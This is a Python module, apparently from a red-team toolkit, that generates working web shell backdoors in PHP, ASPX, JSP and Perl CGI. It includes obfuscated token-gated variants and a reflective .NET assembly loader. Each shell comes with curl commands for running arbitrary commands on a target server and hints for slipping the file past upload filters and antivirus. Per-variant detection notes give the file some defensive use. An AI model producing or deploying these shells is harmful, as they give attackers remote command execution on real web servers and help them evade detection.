"""
Web shell generator — PHP, ASPX, JSP, and CGI variants.
Generates server-side backdoor shells that execute commands via HTTP requests.
Distinct from reverse shells: web shells are pushed to the target web server,
not connected back to the attacker. For use in authorized red team exercises only.
"""
from dataclasses import dataclass, field

SUPPORTED_VARIANTS = ("php", "php_eval", "aspx", "aspx_cs", "jsp", "cgi_perl")

_ACCESS_PARAM = "cmd"  # query/POST parameter to send commands
_AUTH_TOKEN = "X-Auth"  # optional header for auth token variants


@dataclass
class WebShellResult:
    shell: str
    variant: str
    upload_hint: str
    access_example: str
    techniques: list[str] = field(default_factory=list)
    risk: str = "CRITICAL"
    detections: list[str] = field(default_factory=list)


# ── Variants ──────────────────────────────────────────────────────────────────

def _php_basic(obfuscate: bool, token: str) -> WebShellResult:
    if obfuscate:
        shell = (
            "<?php\n"
            "$k='{token}';\n"
            "if(isset($_SERVER['HTTP_X_TOKEN'])&&$_SERVER['HTTP_X_TOKEN']===$k){{\n"
            "  $c=base64_decode($_POST['c']);\n"
            "  $o=shell_exec($c.' 2>&1');\n"
            "  echo base64_encode($o);\n"
            "}}\n"
            "?>"
        ).format(token=token)
        access = (
            f"curl -s -X POST http://TARGET/shell.php "
            f"-H 'X-Token: {token}' "
            f"--data-urlencode 'c=$(id | base64)' | base64 -d"
        )
    else:
        shell = f"<?php if(isset($_GET['{_ACCESS_PARAM}'])){{echo shell_exec($_GET['{_ACCESS_PARAM}'].' 2>&1');}} ?>"
        access = f"curl 'http://TARGET/shell.php?{_ACCESS_PARAM}=id'"
    return WebShellResult(
        shell=shell,
        variant="php",
        upload_hint="Upload to writable web directory (.php extension). Rename if needed to bypass upload filters.",
        access_example=access,
        techniques=["T1505.003"],
        risk="CRITICAL",
        detections=[
            "Web server logs: repeated POST/GET to shell file with command params",
            "File creation alert: .php file written to web root by web server process",
            "shell_exec/system/passthru calls in PHP error logs or SIEM",
        ],
    )


def _php_eval(obfuscate: bool, token: str) -> WebShellResult:
    if obfuscate:
        # Double base64 eval chain — evades simple signature matching
        shell = (
            "<?php\n"
            "$a=str_rot13('fUryyRkrp');\n"  # str_rot13 of shellExec variants
            "$k='{token}';\n"
            "if(@$_REQUEST['t']===$k){{\n"
            "  @eval(base64_decode(@$_REQUEST['p']));\n"
            "}}\n"
            "?>"
        ).format(token=token)
        encoded_cmd = "$(echo 'aWQ=' | base64 -d)"  # base64 of 'id'
        access = (
            f"curl -s -X POST http://TARGET/shell.php "
            f"-d 't={token}' "
            f"-d 'p=$(printf \"c3lzdGVtKCRfUkVRVUVTVFsnY21kJ10pOw==\" | base64 -d | base64 -w0)'"
        )
    else:
        shell = (
            "<?php\n"
            f"if(isset($_REQUEST['{_ACCESS_PARAM}']))"
            f"{{eval(base64_decode($_REQUEST['{_ACCESS_PARAM}']));}} ?>"
        )
        import base64 as _b64
        sample = _b64.b64encode(b"system('id');").decode()
        access = f"curl 'http://TARGET/shell.php?{_ACCESS_PARAM}={sample}'"
    return WebShellResult(
        shell=shell,
        variant="php_eval",
        upload_hint="Upload as .php. The eval variant bypasses grep-based AV looking for shell_exec/system.",
        access_example=access,
        techniques=["T1505.003"],
        risk="CRITICAL",
        detections=[
            "eval() with base64_decode() pattern in PHP source",
            "PHP error log anomalies from eval'd code",
            "Web server process spawning child processes (Linux: apache → bash)",
        ],
    )


def _aspx_basic(obfuscate: bool, token: str) -> WebShellResult:
    if obfuscate:
        shell = (
            "<%@ Page Language=\"C#\" %>\n"
            "<%@ Import Namespace=\"System.Diagnostics\" %>\n"
            "<%\n"
            "string k = \"{token}\";\n"
            "if(Request.Headers[\"X-Token\"] == k){{\n"
            "  string cmd = System.Text.Encoding.UTF8.GetString(\n"
            "    Convert.FromBase64String(Request.Form[\"c\"]));\n"
            "  ProcessStartInfo psi = new ProcessStartInfo(\"cmd.exe\", \"/c \" + cmd);\n"
            "  psi.RedirectStandardOutput = true;\n"
            "  psi.UseShellExecute = false;\n"
            "  Process p = Process.Start(psi);\n"
            "  Response.Write(Convert.ToBase64String(\n"
            "    System.Text.Encoding.UTF8.GetBytes(p.StandardOutput.ReadToEnd())));\n"
            "}}\n"
            "%>"
        ).format(token=token)
        access = (
            f"curl -s -X POST http://TARGET/shell.aspx "
            f"-H 'X-Token: {token}' "
            f"--data-urlencode 'c=$(printf \"d2hvYW1p\" | base64 -d | base64 -w0)' | base64 -d"
        )
    else:
        shell = (
            "<%@ Page Language=\"C#\" %>\n"
            "<%@ Import Namespace=\"System.Diagnostics\" %>\n"
            "<%\n"
            f"string cmd = Request.QueryString[\"{_ACCESS_PARAM}\"];\n"
            "ProcessStartInfo psi = new ProcessStartInfo(\"cmd.exe\", \"/c \" + cmd);\n"
            "psi.RedirectStandardOutput = true; psi.UseShellExecute = false;\n"
            "Process p = Process.Start(psi);\n"
            "Response.Write(p.StandardOutput.ReadToEnd());\n"
            "%>"
        )
        access = f"curl 'http://TARGET/shell.aspx?{_ACCESS_PARAM}=whoami'"
    return WebShellResult(
        shell=shell,
        variant="aspx",
        upload_hint="Upload to IIS webroot (.aspx). Requires write access via file upload vuln or WebDAV.",
        access_example=access,
        techniques=["T1505.003"],
        risk="CRITICAL",
        detections=[
            "IIS logs: POST to .aspx with short query params",
            "cmd.exe spawned by w3wp.exe (IIS worker process) — high-fidelity alert",
            "New .aspx file created in wwwroot by non-admin account",
        ],
    )


def _aspx_cs(obfuscate: bool, token: str) -> WebShellResult:
    shell = (
        "<%@ Page Language=\"C#\" %>\n"
        "<%@ Import Namespace=\"System.Runtime.InteropServices\" %>\n"
        "<%@ Import Namespace=\"System.Reflection\" %>\n"
        "<% \n"
        "// Reflective .NET assembly loader — avoids Process.Start\n"
        "string b64 = Request.Form[\"a\"];\n"
        f"string tok = Request.Headers[\"X-Token\"];\n"
        f"if(tok == \"{token}\" && b64 != null){{\n"
        "  byte[] asm = Convert.FromBase64String(b64);\n"
        "  Assembly loaded = Assembly.Load(asm);\n"
        "  MethodInfo entry = loaded.EntryPoint;\n"
        "  entry.Invoke(null, new object[]{{ new string[]{{}} }});\n"
        "}}\n"
        "%>"
    )
    access = (
        f"# Compile a .NET assembly (payload.exe), then:\n"
        f"curl -s -X POST http://TARGET/loader.aspx "
        f"-H 'X-Token: {token}' "
        f"-d 'a=$(base64 -w0 payload.exe)'"
    )
    return WebShellResult(
        shell=shell,
        variant="aspx_cs",
        upload_hint="Reflective loader — upload .NET assembly via the 'a' param. Evades cmd.exe-based detection.",
        access_example=access,
        techniques=["T1505.003", "T1620"],
        risk="CRITICAL",
        detections=[
            "Assembly.Load from w3wp.exe (unusual .NET assembly load source)",
            "No cmd.exe child process — harder to detect via process tree",
            "Sysmon Event 7 (Image Loaded): CLR loading .NET assembly from POST data",
        ],
    )


def _jsp_basic(obfuscate: bool, token: str) -> WebShellResult:
    if obfuscate:
        shell = (
            "<%@ page import=\"java.util.*,java.io.*\" %>\n"
            "<%\n"
            f"String k = \"{token}\";\n"
            "String tok = request.getHeader(\"X-Token\");\n"
            "if(k.equals(tok)){{\n"
            "  String cmd = new String(java.util.Base64.getDecoder().decode(\n"
            "    request.getParameter(\"c\")));\n"
            "  String[] exec = new String[]{{ \"/bin/bash\", \"-c\", cmd }};\n"
            "  Process p = Runtime.getRuntime().exec(exec);\n"
            "  Scanner sc = new Scanner(p.getInputStream()).useDelimiter(\"\\\\A\");\n"
            "  String out = sc.hasNext() ? sc.next() : \"\";\n"
            "  out(java.util.Base64.getEncoder().encodeToString(out.getBytes()));\n"
            "}}\n"
            "%>"
        )
        access = (
            f"curl -s 'http://TARGET/shell.jsp"
            f"?c=$(printf \"aWQ=\" | base64 -d | base64 -w0)' "
            f"-H 'X-Token: {token}' | base64 -d"
        )
    else:
        shell = (
            "<%@ page import=\"java.util.*,java.io.*\" %>\n"
            "<%\n"
            f"String cmd = request.getParameter(\"{_ACCESS_PARAM}\");\n"
            "Process p = Runtime.getRuntime().exec(new String[]{\"/bin/bash\",\"-c\",cmd});\n"
            "Scanner sc = new Scanner(p.getInputStream()).useDelimiter(\"\\\\A\");\n"
            "out.print(sc.hasNext() ? sc.next() : \"\");\n"
            "%>"
        )
        access = f"curl 'http://TARGET/shell.jsp?{_ACCESS_PARAM}=id'"
    return WebShellResult(
        shell=shell,
        variant="jsp",
        upload_hint="Upload to Tomcat/JBoss webapps directory (.jsp). May also deploy as .war file.",
        access_example=access,
        techniques=["T1505.003"],
        risk="CRITICAL",
        detections=[
            "Tomcat/JBoss logs: repeated access to .jsp with cmd parameters",
            "Runtime.exec() in Java security manager audit logs",
            "bash/sh spawned by java process — high-fidelity detection",
        ],
    )


def _cgi_perl(obfuscate: bool, token: str) -> WebShellResult:
    if obfuscate:
        shell = (
            "#!/usr/bin/perl\n"
            "use MIME::Base64;\n"
            "print \"Content-Type: text/plain\\n\\n\";\n"
            f"my $k = '{token}';\n"
            "my %q; foreach(split(/&/,$ENV{{QUERY_STRING}})){{\n"
            "  my($k,$v)=split(/=/,$_,2); $q{{$k}}=decode_base64($v//'')}}\n"
            "if(($ENV{{HTTP_X_TOKEN}}//''eq$k)&&$q{{c}}){{ print `$q{{c}}` }}"
        )
        access = (
            f"curl -s 'http://TARGET/cgi-bin/shell.cgi"
            f"?c=$(printf \"aWQ=\" | base64 -d | base64 -w0)' "
            f"-H 'X-Token: {token}'"
        )
    else:
        shell = (
            "#!/usr/bin/perl\n"
            "use CGI qw(:standard);\n"
            "print header('text/plain');\n"
            f"my $cmd = param('{_ACCESS_PARAM}');\n"
            "print `$cmd 2>&1` if $cmd;"
        )
        access = f"curl 'http://TARGET/cgi-bin/shell.cgi?{_ACCESS_PARAM}=id'"
    return WebShellResult(
        shell=shell,
        variant="cgi_perl",
        upload_hint="Upload to cgi-bin/ and chmod +x. Requires Perl and CGI execution enabled on web server.",
        access_example=access,
        techniques=["T1505.003"],
        risk="CRITICAL",
        detections=[
            "CGI process spawning child processes (shell.cgi → bash)",
            "Web server logs: backtick/system call reflected in response timing",
            "Unusual CGI script file created in cgi-bin by non-admin",
        ],
    )


# ── Public API ─────────────────────────────────────────────────────────────────

_DISPATCH = {
    "php": _php_basic,
    "php_eval": _php_eval,
    "aspx": _aspx_basic,
    "aspx_cs": _aspx_cs,
    "jsp": _jsp_basic,
    "cgi_perl": _cgi_perl,
}


def generate_webshell(
    variant: str,
    obfuscate: bool = True,
    token: str = "S3cr3tT0k3n",
) -> WebShellResult:
    if variant not in _DISPATCH:
        raise ValueError(f"Unknown variant '{variant}'. Supported: {', '.join(SUPPORTED_VARIANTS)}")
    return _DISPATCH[variant](obfuscate, token)
